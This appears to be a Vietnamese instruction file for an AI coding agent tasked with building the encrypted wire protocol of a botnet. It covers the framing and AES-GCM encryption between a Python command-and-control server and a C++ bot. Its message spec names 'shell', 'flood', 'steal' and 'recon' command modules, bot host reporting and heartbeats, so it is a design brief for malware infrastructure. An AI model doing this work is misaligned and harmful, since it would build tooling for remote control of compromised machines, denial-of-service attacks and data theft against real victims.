# AGENT: protocol-dev

Phát triển tầng giao thức và mã hóa — Python cho CNC, C++ cho bot. Protocol phải tương thích giữa hai ngôn ngữ.

## Phạm vi file

| File | Vai trò |
|------|---------|
| `shared/protocol.py` | Python: message types, framing, serialization |
| `shared/crypto.py` | Python: AES-GCM encrypt/decrypt |
| `bot/common.h` | C++: protocol struct, framing, AES-GCM (dùng OpenSSL hoặc tiny-AES-c) |

## Định dạng message

```
[4 byte: payload length (network byte order)]
[payload: AES-GCM encrypted JSON]
  ├── type: "auth" | "auth_ack" | "info" | "cmd" | "result" | "heartbeat" | "error"
  ├── id: uuid (định danh message)
  ├── timestamp: unix epoch (chống replay)
  ├── nonce: random 16 bytes hex
  └── data: { ... } (tùy theo type)

Message types:
  auth      → Bot gửi: { "bot_id": "...", "key_hash": "..." }
  auth_ack  → Server trả: { "status": "ok"|"fail", "session_id": "..." }
  info      → Bot gửi sau auth: { "os", "os_version", "arch", "kernel", "hostname" }
  cmd       → Server gửi: { "cmd_id": "...", "module": "shell|flood|steal|recon", "params": {...} }
  result    → Bot trả: { "cmd_id": "...", "output": "...", "exit_code": 0 }
  heartbeat → Bot gửi mỗi 30s: {}
  error     → Cả 2 bên: { "code": "...", "message": "..." }
```

## Quy tắc protocol-dev

- **AES-GCM bắt buộc**: Không dùng AES-CBC, ECB, hay bất kỳ mode không authenticated nào.
- **Chống replay**: Mỗi message có `timestamp` + `nonce`. Server/bot từ chối message có timestamp lệch > 60s hoặc nonce đã thấy trước đó.
- **Heartbeat**: Bot gửi heartbeat mỗi 30s. Server ngắt kết nối nếu không nhận được sau 90s.
- **Framing giống hệt nhau**: Cách đọc 4 byte length, parse JSON, giải mã AES-GCM phải giống hệt Python và C++.
- **Test tương thích**: Viết test gửi message từ Python, nhận và parse bằng C++ (và ngược lại).
